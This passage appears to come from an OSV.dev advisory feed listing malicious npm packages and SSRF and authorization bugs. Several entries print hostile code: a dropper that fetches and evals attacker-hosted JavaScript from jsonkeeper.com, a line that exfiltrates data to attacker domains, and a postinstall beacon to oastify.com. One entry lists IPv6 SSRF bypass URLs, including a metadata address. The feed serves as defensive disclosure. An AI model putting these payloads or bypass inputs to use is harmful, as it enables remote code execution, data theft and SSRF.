-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in expandingcards-socket-virtualization (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;expandingcards-socket-virtualization&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `expandingcards-socket-virtualization` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;ca…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/expandingcards-socket-virtualization"&gt;https://www.npmjs.com/package/expandingcards-socket-virtualization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6159"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6157: Malicious code in dropdown-thread (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6157</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6157"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:45Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in dropdown-thread (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;dropdown-thread&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `dropdown-thread` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; fu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/dropdown-thread"&gt;https://www.npmjs.com/package/dropdown-thread&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6157"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6158: Malicious code in enzyme-optimization-bluetooth (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6158</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6158"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:45Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in enzyme-optimization-bluetooth (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;enzyme-optimization-bluetooth&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `enzyme-optimization-bluetooth` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/enzyme-optimization-bluetooth"&gt;https://www.npmjs.com/package/enzyme-optimization-bluetooth&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6158"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6161: Malicious code in flexbox-oauth-machinelearning (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6161</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6161"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:45Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in flexbox-oauth-machinelearning (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;flexbox-oauth-machinelearning&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `flexbox-oauth-machinelearning` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculato…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/flexbox-oauth-machinelearning"&gt;https://www.npmjs.com/package/flexbox-oauth-machinelearning&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6161"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6141: Malicious code in clx-cookie-signature (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6141</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6141"/>
-    <published>2026-06-18T22:28:34Z</published>
-    <updated>2026-06-18T23:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in clx-cookie-signature (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;clx-cookie-signature&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (9e0e91601d276764067b1b209efd17a1f59ef03ff4fc814bcb22c495f4a0f9b3)
-Package impersonates the popular cookie-signature library (copying its README, author field &amp;#x27;TJ Holowaychuk &amp;lt;tj@learnboost.com&amp;gt;&amp;#x27;, and sign/unsign API), but index.js adds a top-level dropper that fires the moment the module is required. Specifically, index.js line 16 issues `require(&amp;#x27;axios&amp;#x27;).get(&amp;#x27;https://www.jsonkeeper.com/b/MYUKZ&amp;#x27;).then(r =&amp;gt; { eval(r.data.content_o); })`, eval&amp;#x27;ing whatever JSON the author currently hosts at that URL. A helper `g()` (index.js lines 18-24) decodes hex-encoded strings to reconstruct the tokens &amp;#x27;axios&amp;#x27;, &amp;#x27;get&amp;#x27;, &amp;#x27;then&amp;#x27; and a second payload URL https://www.jsonkeeper.com/b/HY6M6, providing an obfuscated fallb…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/clx-cookie-signature/v/1.2.1"&gt;https://www.npmjs.com/package/clx-cookie-signature/v/1.2.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6141"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6144: Malicious code in runtime-query (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6144</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6144"/>
-    <published>2026-06-18T22:28:53Z</published>
-    <updated>2026-06-18T23:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in runtime-query (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;runtime-query&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (95ac68a991ebaacd1aef772aa462ad53510471f9f4439659a6e685e877aa460e)
-On require(), index.js (lines 70-77) fetches JSON from https://jsonkeeper.com/b/CI3HT, extracts the `.cookie` field from the response, and passes it to `new Function.constructor(&amp;#x27;require&amp;#x27;, cookie)(require)` — compiling and executing attacker-controlled JavaScript with full access to Node&amp;#x27;s `require`. jsonkeeper.com is an anonymous, mutable paste host: the operator can swap the payload at any time without republishing the package. Any installer (or downstream package) that imports runtime-query gives the author arbitrary code execution on their machine. The package&amp;#x27;s metadata (description claims a generic query framework, empty `author`…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/runtime-query/v/1.6.6"&gt;https://www.npmjs.com/package/runtime-query/v/1.6.6&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6144"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6143: Malicious code in node-vfs-polyfill (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6143</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6143"/>
-    <published>2026-06-18T22:31:27Z</published>
-    <updated>2026-06-18T23:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in node-vfs-polyfill (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;node-vfs-polyfill&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (7fb213e524ed75dcb54961d6d2ee9431ea6a32f4fdcb9d777bc260102920d81b)
-On install, postinstall.js executes automatically and exfiltrates host reconnaissance data to attacker-controlled subdomains on oastify.com (Burp Collaborator), a domain commonly used for out-of-band data exfiltration. The script imports http, https, os, and child_process; calls os.hostname() and execSync() to gather system identifiers; and POSTs the collected data — including hostname, username, and version fields — to hardcoded endpoints such as http://xxxxxxxxx.oastify.com and http://rni4z9qkil62r9dcwosokhtgo7u9i76w.oastify.com. The package name suggests a generic VFS polyfill but the postinstall does no polyfill work; its sole obse…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/node-vfs-polyfill/v/2.0.5"&gt;https://www.npmjs.com/package/node-vfs-polyfill/v/2.0.5&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6143"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6142: Malicious code in db-connector-log (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6142</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6142"/>
-    <published>2026-06-18T22:29:10Z</published>
-    <updated>2026-06-18T23:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in db-connector-log (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;db-connector-log&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (6828cdaf9f4280f7739fd6f5a838a63ea7bc8f7bb0c94eec52fb881c2701c724)
-The package impersonates the legitimate dx-db-connector (the package.json repository field points at git+https://github.com/divbloxjs/dx-db-connector.git) and replicates that connector&amp;#x27;s API surface, while adding an undocumented method queryDBConnect on the exported class. queryDBConnect base64-decodes a hardcoded URL (stored in a variable misleadingly named HASH_KEY and decoded with atob to evade static URL scanners), HTTP-GETs https://jsonkeeper.com/b/L435A — an anonymous, mutable JSON paste host — extracts the response&amp;#x27;s.session field, spawns a detached node child process, and writes that attacker-controlled content to its stdin, ex…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/db-connector-log/v/1.0.0"&gt;https://www.npmjs.com/package/db-connector-log/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6142"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] GHSA-8p33-q827-ghj5: dssrf: every IPv6 category bypasses is_url_safe</title>
-    <id>https://osv.dev/vulnerability/GHSA-8p33-q827-ghj5</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-8p33-q827-ghj5"/>
-    <published>2026-05-06T18:13:32Z</published>
-    <updated>2026-06-18T23:00:08Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-44232"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;dssrf: every IPv6 category bypasses is_url_safe&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-44232&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;dssrf&lt;/code&gt; — fixed in 1.0.3&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;A vulnerability on dssrf allow, an attacker to use, one of them following ipv6
-
-```rust
-Input	Category
-http://[::1]/	IPv6 loopback
-http://[fc00::1]/	IPv6 ULA
-http://[fe80::1]/	IPv6 link-local
-http://[::ffff:127.0.0.1]/	IPv4-mapped loopback
-http://[::ffff:169.254.169.254]/	IPv4-mapped IMDS
-http://[::ffff:100.64.0.1]/	IPv4-mapped CGNAT
-http://[64:ff9b::7f00:1]/	NAT64 well-known prefix
-http://[64:ff9b:1::1]/	NAT64 local-use (RFC 8215)
-http://[5f00::1]/	SRv6 SID (RFC 9602)
-http://[3fff::1]/	IPv6 documentation (RFC 9637)
-http://[fec0::1]/	IPv6 site-local (deprecated, RFC 3879)
-http://[::127.0.0.1]/	IPv4-compatible IPv6
-```
-
-one of those to bypass dssrf and the attacker get **SSRF**, we claim that ipv6 disabled entirely that is wrong on our documentation
-
-### POC
-
-```bash
-mkdir dssrf-poc &amp;amp;&amp;amp; cd d…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/HackingRepo/dssrf-js/security/advisories/GHSA-8p33-q827-ghj5"&gt;https://github.com/HackingRepo/dssrf-js/security/advisories/GHSA-8p33-q827-ghj5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44232"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-44232&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/HackingRepo/dssrf-js"&gt;https://github.com/HackingRepo/dssrf-js&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-8p33-q827-ghj5"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] GHSA-q59x-jc9f-gfqf: Signal K Server: Server-Side Request Forgery via Remote Connection Endpoints</title>
-    <id>https://osv.dev/vulnerability/GHSA-q59x-jc9f-gfqf</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-q59x-jc9f-gfqf"/>
-    <published>2026-06-18T21:13:36Z</published>
-    <updated>2026-06-18T21:30:07Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-55591"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Signal K Server: Server-Side Request Forgery via Remote Connection Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55591&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;signalk-server&lt;/code&gt; — fixed in 2.28.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
-signalk-server versions up to and including 2.27.0 contain a Server-Side Request Forgery (SSRF) vulnerability in three administrative endpoints used for remote Signal K server connection management. The `makeRemoteRequest()` function accepts attacker-controlled `host`, `port`, `useTLS`, and `selfsignedcert` parameters without any validation, allowing an attacker to force the server to make arbitrary HTTP/HTTPS requests to internal network resources, cloud metadata services, and other unintended destinations.
-
-When security is not configured (the default state), these endpoints require **no authentication**.
-
-### Details
-#### Vulnerable Function
-
-The core vulnerability is in `makeRemoteRequest()` at `src/serverroutes.ts:2483-2524`:
-
-```typescript
-function makeRemoteRequest(
-  ho…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/SignalK/signalk-server/security/advisories/GHSA-q59x-jc9f-gfqf"&gt;https://github.com/SignalK/signalk-server/security/advisories/GHSA-q59x-jc9f-gfqf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/SignalK/signalk-server"&gt;https://github.com/SignalK/signalk-server&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-q59x-jc9f-gfqf"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] GHSA-4hpg-mp64-x7xq: OpenClaw: Internal/webchat command auth could inherit ownerAllowFrom wildcard state</title>
-    <id>https://osv.dev/vulnerability/GHSA-4hpg-mp64-x7xq</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-4hpg-mp64-x7xq"/>
-    <published>2026-06-18T20:44:06Z</published>
-    <updated>2026-06-18T21:00:15Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-53854"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;OpenClaw: Internal/webchat command auth could inherit ownerAllowFrom wildcard state&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-53854&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;openclaw&lt;/code&gt; — fixed in 2026.4.25&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
-
-Internal/webchat command auth could inherit ownerAllowFrom wildcard state. In affected versions, a sender on an affected internal or webchat path could inherit wildcard ownerAllowFrom state across channel boundaries.
-
-This advisory is scoped to the named feature and configuration. It does not change OpenClaw&amp;#x27;s trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.
-
-### Impact
-
-When the affected feature is enabled and reachable, this could run owner-style command behavior that should have stayed channel-scoped. Practical impact depends on the operator&amp;#x27;s configuration and whether lower-trust input can reach that path.
-
-…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-4hpg-mp64-x7xq"&gt;https://github.com/openclaw/openclaw/security/advisories/GHSA-4hpg-mp64-x7xq&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53854"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-53854&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/openclaw/openclaw"&gt;https://github.com/openclaw/openclaw&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-ownerallowfrom-wildcard-inheritance-in-internal-webchat-commands"&gt;https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-ownerallowfrom-wildcard-inheritance-in-internal-webchat-commands&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-4hpg-mp64-x7xq"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
 </feed>
